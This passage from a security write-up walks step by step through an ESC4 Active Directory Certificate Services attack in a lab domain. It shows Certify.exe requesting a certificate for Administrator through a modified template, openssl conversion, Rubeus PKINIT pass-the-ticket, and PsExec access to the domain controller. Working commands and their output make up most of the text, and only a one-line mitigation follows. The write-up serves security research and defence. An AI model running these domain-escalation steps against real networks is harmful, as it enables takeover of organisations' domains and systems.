                                      CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519

--snip--
```

In the output of `Certify.exe`, `pkiextendedkeyusage` and "Application Policies" (`mspki-ra-application-policies`) remain "Encrypting File System", but no problem.
As mentioned earlier, `mspki-certificate-application-policy` takes precedence over `pkiextendedkeyusage` and `mspki-ra-application-policies`, but `mspki-certificate-application-policy` attribute is not displayed in outputs of `Certify.exe` released at the time of this writing.
To confirm the result, we can use `Get-DomainObject` function in PowerView or `DirectoryServices.DirectorySearcher` object with PowerShell:

```
PS C:\Tools> Get-DomainObject -SearchBase "CN=Configuration,DC=contoso,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -Identity ESC4

mspki-enrollment-flag                : 41
mspki-certificate-name-flag          : -2113929215
pkidefaultcsps                       : 1,Microsoft Enhanced Cryptographic Provider v1.0
distinguishedname                    : CN=ESC4,CN=Certificate Templates,CN=Public Key
                                       Services,CN=Services,CN=Configuration,DC=contoso,DC=local
pkidefaultkeyspec                    : 1
objectclass                          : {top, pKICertificateTemplate}
displayname                          : ESC4
name                                 : ESC4
mspki-certificate-application-policy : 1.3.6.1.5.5.7.3.2
pkiextendedkeyusage                  : 1.3.6.1.4.1.311.10.3.4
showinadvancedviewonly               : True
cn                                   : ESC4
flags                                : 131640
whenchanged                          : 10/1/2021 5:19:25 AM
instancetype                         : 4
usncreated                           : 49238
objectguid                           : 88ea6142-28af-4b2d-99a8-bd9d10bc53ba
mspki-ra-signature                   : 0
mspki-cert-template-oid              : 1.3.6.1.4.1.311.21.8.15030743.11787675.8208785.16745297.429065.235.12902112.1610
                                       0058
pkimaxissuingdepth                   : 0
objectcategory                       : CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,DC=contoso,DC=local
dscorepropagationdata                : {10/1/2021 5:09:12 AM, 10/1/2021 4:58:41 AM, 1/1/1601 12:00:00 AM}
mspki-minimal-key-size               : 2048
mspki-private-key-flag               : 16842768
pkikeyusage                          : {32, 0}
revision                             : 100
pkiexpirationperiod                  : {0, 64, 57, 135...}
usnchanged                           : 49275
whencreated                          : 10/1/2021 4:57:23 AM
mspki-template-schema-version        : 2
pkioverlapperiod                     : {0, 128, 166, 10...}
mspki-template-minor-revision        : 4
pkicriticalextensions                : 2.5.29.15
mspki-ra-application-policies        : 1.3.6.1.4.1.311.10.3.4



PS C:\Tools>
```

> __UPDATE__: After I wrote this article, I sent [a pull request](https://github.com/GhostPack/Certify/pull/8) to the GitHub repository for `Certify.exe`. 
> Lee Christensen ([@tifkin_](https://twitter.com/tifkin_)) merged my pull request and made some update.
> Now we can confirm `mspki-certificate-application-policy` attribute with `Certify.exe` as follows:
> 
> ```
> C:\Tools>Certify.exe find /vulnerable
> 
> --snip--
> 
> [!] Vulnerable Certificates Templates :
> 
>     CA Name                               : CA01.contoso.local\contoso-CA01-CA
>     Template Name                         : ESC4
>     Schema Version                        : 2
>     Validity Period                       : 1 year
>     Renewal Period                        : 6 weeks
>     msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT, SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
>     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
>     Authorized Signatures Required        : 0
>     Application Policies                  : Encrypting File System
>     pkiextendedkeyusage                   : Encrypting File System
>     mspki-certificate-application-policy  : Client Authentication
>     Permissions
>       Enrollment Permissions
>         Enrollment Rights           : CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
>                                       CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
>                                       CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519
> 
> --snip--
> ```

### Domain Escalation
Now we can issue authentication purpose certificates with high privileged domain account by using the ESC4 certificate template.
At first, we request a high privileged domain account certificate with `Certify.exe`:

```
C:\Tools>Certify.exe request /ca:ca01.contoso.local\contoso-ca01-ca /template:ESC4 /altname:Administrator@contoso.local

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : CONTOSO\david
[*] No subject name specified, using current context as subject.

[*] Template                : ESC4
[*] Subject                 : CN=David, CN=Users, DC=contoso, DC=local
[*] AltName                 : Administrator@contoso.local

[*] Certificate Authority   : ca01.contoso.local\contoso-ca01-ca

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 24

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3hjP7WuFNVeHYRtKvsZzYBdZ1sshFXuZ5sWc/cByci3hw+KD

--snip--

zMvpKPu7qAMxd83cnK0YDJW6JHHdJYfJKEkDOGKRLmKy3pAVmZGrhA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGATCCBOmgAwIBAgITYAAAABhIrlHkiGiNxAAAAAAAGDANBgkqhkiG9w0BAQsF

--snip--

zilBjRs=
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:03.8813593

C:\Tools>
```

Then, we convert the pem output to pfx format with the `openssl` command in output of `Certify.exe` (we set the password to "123456" in this article):

```bash
user@ubuntu:~/Desktop$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
Enter Export Password:
Verifying - Enter Export Password:
user@ubuntu:~/Desktop$
```

If you want to check certificate informations, you can check it with `certutil.exe` as follows:

```
C:\Tools>certutil -v -dump admin.pfx
Enter PFX password:
================ Certificate 0 ================
================ Begin Nesting Level 1 ================
Element 0:
X509 Certificate:
Version: 3
Serial Number: 600000001848ae51e488688dc4000000000018
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Issuer:
    CN=contoso-CA01-CA
    DC=contoso
    DC=local
  Name Hash(sha1): ab3a6d03e2da521aacc5f2712287ef271ffd5a87
  Name Hash(md5): 800c927fb83466c80ce5466c127853e6

 NotBefore: 9/30/2021 10:12 PM
 NotAfter: 9/30/2022 10:12 PM

Subject:
    CN=David
    CN=Users
    DC=contoso
    DC=local
  Name Hash(sha1): e85f67a4aeba2f218a32cf2c4ffb8c69738dfaf0
  Name Hash(md5): ec9d5e57fde746eebe0999705918d24d

--snip--

Certificate Extensions: 10
    1.3.6.1.4.1.311.21.7: Flags = 0, Length = 30
    Certificate Template Information
        Template=ESC4(1.3.6.1.4.1.311.21.8.15030743.11787675.8208785.16745297.429065.235.12902112.16100058)
        Major Version Number=100
        Minor Version Number=4

    2.5.29.37: Flags = 0, Length = c
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)

--snip--

    2.5.29.17: Flags = 0, Length = 2f
    Subject Alternative Name
        Other Name:
             Principal Name=Administrator@contoso.local

--snip--
```

Finally, we perform PKINIT Kerberos authentication and Pass-the-Ticket attack with the generated pfx file:

```
C:\Tools>whoami /user

USER INFORMATION
----------------

User Name     SID
============= =============================================
contoso\david S-1-5-21-3654360273-254804765-2004310818-1104

C:\Tools>dir \\dc01.contoso.local\C$
Access is denied.

C:\Tools>Rubeus.exe purge

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Purge Tickets
Luid: 0x0
[+] Tickets successfully purged!

C:\Tools>Rubeus.exe asktgt /user:Administrator /password:123456 /certificate:admin.pfx /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=David, CN=Users, DC=contoso, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'contoso.local\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF4jCCBd6gAwIBBaEDAgEWooIE7zCCBOthggTnMIIE46ADAgEFoQ8bDUN.....

      --snip--

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/contoso.local
  ServiceRealm             :  CONTOSO.LOCAL
  UserName                 :  Administrator
  UserRealm                :  CONTOSO.LOCAL
  StartTime                :  9/30/2021 10:30:17 PM
  EndTime                  :  10/1/2021 8:30:17 AM
  RenewTill                :  10/7/2021 10:30:17 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  XJo/1JOAKw1smiTuPRBjBg==
  ASREP (key)              :  F12DC0EEFA51E0F02DD60D6FE787392E


C:\Tools>Rubeus.exe klist

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


Action: List Kerberos Tickets (Current User)

[*] Current LUID    : 0x6d35b

  UserName                 : david
  Domain                   : CONTOSO
  LogonId                  : 0x6d35b
  UserSID                  : S-1-5-21-3654360273-254804765-2004310818-1104
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 9/30/2021 10:02:20 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : CONTOSO.LOCAL
  UserPrincipalName        : david@contoso.local

    [0] - 0x12 - aes256_cts_hmac_sha1
      Start/End/MaxRenew: 9/30/2021 10:30:17 PM ; 10/1/2021 8:30:17 AM ; 10/7/2021 10:30:17 PM
      Server Name       : krbtgt/contoso.local @ CONTOSO.LOCAL
      Client Name       : Administrator @ CONTOSO.LOCAL
      Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)


C:\Tools>dir \\dc01.contoso.local\C$
 Volume in drive \\dc01.contoso.local\C$ has no label.
 Volume Serial Number is BE65-6495

 Directory of \\dc01.contoso.local\C$

09/15/2018  12:19 AM    <DIR>          PerfLogs
09/12/2021  07:34 PM    <DIR>          Program Files
09/15/2018  02:06 AM    <DIR>          Program Files (x86)
09/12/2021  04:09 AM    <DIR>          Tools
09/12/2021  07:33 PM    <DIR>          Users
09/30/2021  07:35 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  51,451,158,528 bytes free

C:\Tools>
```

Now we achieved domain escalation by abusing WriteDacl for a certificate template:

```
C:\Tools>whoami /user

USER INFORMATION
----------------

User Name     SID
============= =============================================
contoso\david S-1-5-21-3654360273-254804765-2004310818-1104

C:\Tools>PsExec64.exe -accepteula \\dc01.contoso.local cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.17763.379]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
DC01

C:\Windows\system32>whoami /user

USER INFORMATION
----------------

User Name             SID
===================== ============================================
contoso\administrator S-1-5-21-3654360273-254804765-2004310818-500

C:\Windows\system32>
```

## Mitigation
This attack method could be mitigated by restricting the assignment of WriteDacl permissions to certificate template objects.

## Conclusion
In this article, we performed ACE attack to a vulnerable template for domain escalation.
Excessive allocation of WriteDacl permissions for domain objects lead to domain escalation vulnerability.
In order to reduce the possibility of being attacked, certificate templates must be hardened.

## Acknowledgments
+ Will Schroeder ([@harmj0y](https://twitter.com/harmj0y))
+ Lee Christensen ([@tifkin_](https://twitter.com/tifkin_))
+ Christoph Falta ([@cfalta](https://twitter.com/cfalta))
+ Mike Jankowski-Lorek ([@MJL_PL](https://twitter.com/MJL_PL))
+ Milosz Piasecki ([@CQUREAcademy](https://twitter.com/cqureacademy))
